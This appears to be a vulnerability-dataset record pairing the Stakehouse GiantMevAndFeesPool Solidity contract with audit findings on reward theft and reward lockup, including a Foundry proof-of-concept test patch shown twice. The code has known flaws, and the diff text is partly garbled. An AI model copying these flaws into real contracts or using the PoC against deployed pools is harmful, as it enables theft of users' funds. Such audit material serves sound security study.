[
    {
        "Code": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n",
        "CodeNames": [
            "GiantMevAndFeesPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [],
                "Type": " Any user being the first to claim rewards from  GiantMevAndFeesPool  can unexepectedly collect them all",
                "Description": "*Submitted by clems4ever(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203<br\n\nAny user being the first to claim rewards from GiantMevAndFeesPool, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards...\n\n\n<https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de\n\nCopy paste it in the test suite and run it.\n\n\nforge test\n\n",
                "Repair": "\nRework the way accumulatedETHPerLPShare and claimed is used. There are multiple bugs due to the interaction between those variables as you will see in my other reports.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32)\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-02",
                "Location": [],
                "Type": " Rewards of  GiantMevAndFeesPool  can be locked for all users",
                "Description": "*Submitted by clems4ever(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8<br\n\nAny malicious user could make the rewards in GiantMevAndFeesPool inaccessible to all other users...\n\n\n<https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41\n\nCopy the file in the test suite and run the test.\n\n\nforge test\n\n",
                "Repair": "\nProtect the inherited functions of the ERC20 tokens (GiantLP and LPToken) because transfer is not protected and can trigger the before and after hooks. There is the same issue with LPToken and StakingFundsVault.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33)\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-12",
                "Location": [
                    "diff\ndiff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\nindex 81be706..ca44ae6 100644\n--a/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {\n             // Calculate how much ETH rewards the address is owed / due \n             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) claimed[_user][_token];\n             if (due  0) {\n               claimed[_user][_token] = due;\n+                claimed[_user][_token] += due; // temp fix claimed calculation\n \n                 totalClaimed += due;\n \ndiff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.sol\nindex 7e8bfdb..6468373 100644\n--a/test/foundry/GiantPools.t.sol\n+++ b/test/foundry/GiantPools.t.sol\n@@ -5,14 +5,18 @@ pragma //solidity ^0.8.13;\n import \"forge-std/console.sol\";\n import { TestUtils } from \"../utils/TestUtils.sol\";\n \n+import { MockLiquidStakingManager } from \"../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol\";\n import { GiantSavETHVaultPool } from \"../../contracts/liquid-staking/GiantSavETHVaultPool.sol\";\n import { GiantMevAndFeesPool } from \"../../contracts/liquid-staking/GiantMevAndFeesPool.sol\";\n import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n+import { GiantLP } from \"../../contracts/liquid-staking/GiantLP.sol\";\n import { MockSlotRegistry } from \"../../contracts/testing/stakehouse/MockSlotRegistry.sol\";\n import { MockSavETHVault } from \"../../contracts/testing/liquid-staking/MockSavETHVault.sol\";\n import { MockGiantSavETHVaultPool } from \"../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol\";\n import { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n \n+import \"forge-std/console.sol\";\n+\n contract GiantPoolTests is TestUtils {\n \n     MockGiantSavETHVaultPool public giantSavETHPool;\n@@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {\n         assertEq(dETHToken.balanceOf(savETHUser), 24 ether);\n     }\n \n+    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) {\n+        manager = deployNewLiquidStakingNetwork(\n+            factory,\n+            admin,\n+            true,\n+            \"LSDN\"\n+        );\n+\n+        savETHVault = MockSavETHVault(address(manager.savETHVault()));\n+\n+        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken());\n+\n+        // Set up users and ETH\n+        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n+        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n+\n+        // Register BLS key\n+        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour);\n+\n+        // Deposit ETH into giant savETH\n+        vm.prank(savETHUser);\n+        giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n+        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n+        assertEq(address(giantSavETHPool).balance, 24 ether);\n+\n+        // Deploy ETH from giant LP into savETH pool of LSDN instance\n+        bytes[][] memory blsKeysForVaults = new bytes[][(1);\n+        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey);\n+\n+        uint256[][] memory stakeAmountsForVaults = new uint256[][(1);\n+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n+\n+        giantSavETHPool.batchDepositETHForStaking(\n+            getAddressArrayFromValues(address(manager.savETHVault())),\n+            getUint256ArrayFromValues(24 ether),\n+            blsKeysForVaults,\n+            stakeAmountsForVaults\n+        );\n+        assertEq(address(manager.savETHVault()).balance, 24 ether);\n+\n+        assert(giantFeesAndMevPool.balance = 4 ether);\n+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);\n+        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking(\n+            getAddressArrayFromValues(address(manager.stakingFundsVault())),\n+            getUint256ArrayFromValues(4 ether),\n+            blsKeysForVaults,\n+            stakeAmountsForVaults\n+        );\n+\n+        // Ensure we can stake and mint derivatives\n+        stakeAndMintDerivativesSingleKey(blsPubKey);\n+\n+        return payable(manager);\n+    }\n+\n+    function testTransferDOSUserOrphansFutureRewards() public {\n+\n+        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether);\n+        address feesAndMevUserTwo = accountFour;\n+\n+       // Deposit ETH into giant fees and mev\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether);\n+        vm.stopPrank();\n+\n+        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne));\n+        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo));\n+\n+        bytes[][] memory blsPubKeyOneInput = new bytes[][(1);\n+        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne);\n+\n+        bytes[][] memory blsPubKeyTwoInput = new bytes[][(1);\n+        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo);\n+\n+        vm.warp(block.timestamp + 3 hours);\n+\n+        // Add 2 eth rewards to manager1's staking funds vault.\n+        vm.deal(address(manager1.stakingFundsVault()), 2 ether);\n+\n+        // Claim rewards into the giant pool and distribute them to user one.\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.claimRewards(\n+            feesAndMevUserOne,\n+            getAddressArrayFromValues(address(manager1.stakingFundsVault())),\n+            blsPubKeyOneInput);\n+        vm.stopPrank();\n+\n+        // User one has received all the rewards and has no more previewed rewards.\n+        assertEq(feesAndMevUserOne.balance, 2 ether);\n+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether);\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserOne,\n+                new address[(0),\n+                new LPToken[][(0)),\n+                0);\n+\n+        // Check the claimed[] value for user 1. It is correct.\n+        assertEq(\n+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),\n+            2 ether);\n+\n+        // User one transfers half their giant tokens to user 2.\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether);\n+        vm.stopPrank();\n+\n+        // After the tokens have been transferred to user 2, user 1's claimed[] remains\n+        // unchanged and is higher than the accumulated payout per share for user 1's\n+        // current number of shares.\n+        assertEq(\n+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),\n+            2 ether);\n+\n+        // With this incorrect value of claimed[] causing a subtraction underflow, user one\n+        // cannot preview accumulated eth or perform any action that attempts to claim their\n+        // rewards such as transferring their tokens.\n+        vm.startPrank(feesAndMevUserOne);\n+        vm.expectRevert();\n+        giantFeesAndMevPool.previewAccumulatedETH(\n+            feesAndMevUserOne,\n+            new address[(0),\n+            new LPToken[][(0));\n+\n+        console.log(\"the revert expected now\");\n+        GiantLP token = giantFeesAndMevPool.lpTokenETH();\n+        vm.expectRevert();\n+        token.transfer(feesAndMevUserTwo, 1 ether);\n+        vm.stopPrank();\n+\n+        // Add 1 eth rewards to manager2's staking funds vault.\n+        vm.deal(address(manager2.stakingFundsVault()), 2 ether);\n+\n+        // User 2 claims rewards into the giant pool and obtains its 1/2 share.\n+        vm.startPrank(feesAndMevUserTwo);\n+        giantFeesAndMevPool.claimRewards(\n+            feesAndMevUserTwo,\n+            getAddressArrayFromValues(address(manager2.stakingFundsVault())),\n+            blsPubKeyTwoInput);\n+        vm.stopPrank();\n+        assertEq(feesAndMevUserTwo.balance, 1 ether);\n+\n+        // At this point, user 1 ought to have accumulated 1 ether from the rewards,\n+        // however accumulated eth is listed as 0.\n+        // The reason is that when the giant pool tokens were transferred to\n+        // user two, the claimed[] value for user one was left unchanged.\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserOne,\n+                new address[(0),\n+                new LPToken[][(0)),\n+                0);\n+\n+        // The pool has received 4 eth rewards and paid out 3, but no users\n+        // are listed as having accumulated the eth. It is orphaned.\n+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether);\n+        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether);\n+\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserTwo,\n+                new address[(0),\n+                new LPToken[][(0)),\n+                0);\n+\n+    }\n+\n }\n No newline at end of file\n\n"
                ],
                "Type": " Sender transferring  GiantMevAndFeesPool  tokens can afterward experience pool DOS and orphaning of future rewards",
                "Description": "*Submitted by 9svR6w(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178), also found by JTJabba(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/358), unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/269), and aphak5010(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/206)*\n\nWhen a user transfers away GiantMevAndFeesPool tokens, the pool's claimed[] computed is left unchanged and still corresponds to what they had claimed with their old (higher) number of tokens. (See GiantMevAndFeesPool afterTokenTransfer() no adjustment is made to claimed[] on the from side.) As a result, their claimed[] may be higher than the max amount they could possibly have claimed for their new (smaller) number of tokens. The erroneous claimed value can cause an integer overflow when the claimed[] value is subtracted, leading to inability for this user to access some functions of the GiantMevAndFeesPool including such things as being able to transfer their tokens (overflow is triggered in a callback attempting to pay out their rewards). These overflows will occur in SyndicateRewardsProcessor's _previewAccumulatedETH() and _distributeETHRewardsToUserForToken(), the latter of which is called in a number of places. When rewards are later accumulated in the pool, the user will not be able to claim certain rewards owed to them because of the incorrect (high) claimed[] value. The excess rewards will be orphaned in the pool.\n\n\nThis patch demonstrates both DOS and orphaned rewards due to the claimed[] error described above. Note that the patch includes a temp fix for the separate issue calculating claimed[] in _distributeETHRewardsToUserForToken() in order to demonstrate this is a separate issue.\n\nRun test\n\n    forge test -m testTransferDOSUserOrphansFutureRewards\n\nPatch\n\ndiff\ndiff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\nindex 81be706..ca44ae6 100644\n--a/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {\n             // Calculate how much ETH rewards the address is owed / due \n             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) claimed[_user][_token];\n             if (due  0) {\n               claimed[_user][_token] = due;\n+                claimed[_user][_token] += due; // temp fix claimed calculation\n \n                 totalClaimed += due;\n \ndiff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.sol\nindex 7e8bfdb..6468373 100644\n--a/test/foundry/GiantPools.t.sol\n+++ b/test/foundry/GiantPools.t.sol\n@@ -5,14 +5,18 @@ pragma solidity ^0.8.13;\n import \"forge-std/console.sol\";\n import { TestUtils } from \"../utils/TestUtils.sol\";\n \n+import { MockLiquidStakingManager } from \"../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol\";\n import { GiantSavETHVaultPool } from \"../../contracts/liquid-staking/GiantSavETHVaultPool.sol\";\n import { GiantMevAndFeesPool } from \"../../contracts/liquid-staking/GiantMevAndFeesPool.sol\";\n import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n+import { GiantLP } from \"../../contracts/liquid-staking/GiantLP.sol\";\n import { MockSlotRegistry } from \"../../contracts/testing/stakehouse/MockSlotRegistry.sol\";\n import { MockSavETHVault } from \"../../contracts/testing/liquid-staking/MockSavETHVault.sol\";\n import { MockGiantSavETHVaultPool } from \"../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol\";\n import { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n \n+import \"forge-std/console.sol\";\n+\n contract GiantPoolTests is TestUtils {\n \n     MockGiantSavETHVaultPool public giantSavETHPool;\n@@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {\n         assertEq(dETHToken.balanceOf(savETHUser), 24 ether);\n     }\n \n+    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) {\n+        manager = deployNewLiquidStakingNetwork(\n+            factory,\n+            admin,\n+            true,\n+            \"LSDN\"\n+        );\n+\n+        savETHVault = MockSavETHVault(address(manager.savETHVault()));\n+\n+        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken());\n+\n+        // Set up users and ETH\n+        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n+        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n+\n+        // Register BLS key\n+        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour);\n+\n+        // Deposit ETH into giant savETH\n+        vm.prank(savETHUser);\n+        giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n+        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n+        assertEq(address(giantSavETHPool).balance, 24 ether);\n+\n+        // Deploy ETH from giant LP into savETH pool of LSDN instance\n+        bytes[][] memory blsKeysForVaults = new bytes[][(1);\n+        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey);\n+\n+        uint256[][] memory stakeAmountsForVaults = new uint256[][(1);\n+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n+\n+        giantSavETHPool.batchDepositETHForStaking(\n+            getAddressArrayFromValues(address(manager.savETHVault())),\n+            getUint256ArrayFromValues(24 ether),\n+            blsKeysForVaults,\n+            stakeAmountsForVaults\n+        );\n+        assertEq(address(manager.savETHVault()).balance, 24 ether);\n+\n+        assert(giantFeesAndMevPool.balance = 4 ether);\n+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);\n+        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking(\n+            getAddressArrayFromValues(address(manager.stakingFundsVault())),\n+            getUint256ArrayFromValues(4 ether),\n+            blsKeysForVaults,\n+            stakeAmountsForVaults\n+        );\n+\n+        // Ensure we can stake and mint derivatives\n+        stakeAndMintDerivativesSingleKey(blsPubKey);\n+\n+        return payable(manager);\n+    }\n+\n+    function testTransferDOSUserOrphansFutureRewards() public {\n+\n+        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether);\n+        address feesAndMevUserTwo = accountFour;\n+\n+       // Deposit ETH into giant fees and mev\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether);\n+        vm.stopPrank();\n+\n+        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne));\n+        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo));\n+\n+        bytes[][] memory blsPubKeyOneInput = new bytes[][(1);\n+        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne);\n+\n+        bytes[][] memory blsPubKeyTwoInput = new bytes[][(1);\n+        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo);\n+\n+        vm.warp(block.timestamp + 3 hours);\n+\n+        // Add 2 eth rewards to manager1's staking funds vault.\n+        vm.deal(address(manager1.stakingFundsVault()), 2 ether);\n+\n+        // Claim rewards into the giant pool and distribute them to user one.\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.claimRewards(\n+            feesAndMevUserOne,\n+            getAddressArrayFromValues(address(manager1.stakingFundsVault())),\n+            blsPubKeyOneInput);\n+        vm.stopPrank();\n+\n+        // User one has received all the rewards and has no more previewed rewards.\n+        assertEq(feesAndMevUserOne.balance, 2 ether);\n+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether);\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserOne,\n+                new address[(0),\n+                new LPToken[][(0)),\n+                0);\n+\n+        // Check the claimed[] value for user 1. It is correct.\n+        assertEq(\n+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),\n+            2 ether);\n+\n+        // User one transfers half their giant tokens to user 2.\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether);\n+        vm.stopPrank();\n+\n+        // After the tokens have been transferred to user 2, user 1's claimed[] remains\n+        // unchanged and is higher than the accumulated payout per share for user 1's\n+        // current number of shares.\n+        assertEq(\n+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),\n+            2 ether);\n+\n+        // With this incorrect value of claimed[] causing a subtraction underflow, user one\n+        // cannot preview accumulated eth or perform any action that attempts to claim their\n+        // rewards such as transferring their tokens.\n+        vm.startPrank(feesAndMevUserOne);\n+        vm.expectRevert();\n+        giantFeesAndMevPool.previewAccumulatedETH(\n+            feesAndMevUserOne,\n+            new address[(0),\n+            new LPToken[][(0));\n+\n+        console.log(\"the revert expected now\");\n+        GiantLP token = giantFeesAndMevPool.lpTokenETH();\n+        vm.expectRevert();\n+        token.transfer(feesAndMevUserTwo, 1 ether);\n+        vm.stopPrank();\n+\n+        // Add 1 eth rewards to manager2's staking funds vault.\n+        vm.deal(address(manager2.stakingFundsVault()), 2 ether);\n+\n+        // User 2 claims rewards into the giant pool and obtains its 1/2 share.\n+        vm.startPrank(feesAndMevUserTwo);\n+        giantFeesAndMevPool.claimRewards(\n+            feesAndMevUserTwo,\n+            getAddressArrayFromValues(address(manager2.stakingFundsVault())),\n+            blsPubKeyTwoInput);\n+        vm.stopPrank();\n+        assertEq(feesAndMevUserTwo.balance, 1 ether);\n+\n+        // At this point, user 1 ought to have accumulated 1 ether from the rewards,\n+        // however accumulated eth is listed as 0.\n+        // The reason is that when the giant pool tokens were transferred to\n+        // user two, the claimed[] value for user one was left unchanged.\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserOne,\n+                new address[(0),\n+                new LPToken[][(0)),\n+                0);\n+\n+        // The pool has received 4 eth rewards and paid out 3, but no users\n+        // are listed as having accumulated the eth. It is orphaned.\n+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether);\n+        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether);\n+\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserTwo,\n+                new address[(0),\n+                new LPToken[][(0)),\n+                0);\n+\n+    }\n+\n }\n No newline at end of file\n\n\n\n",
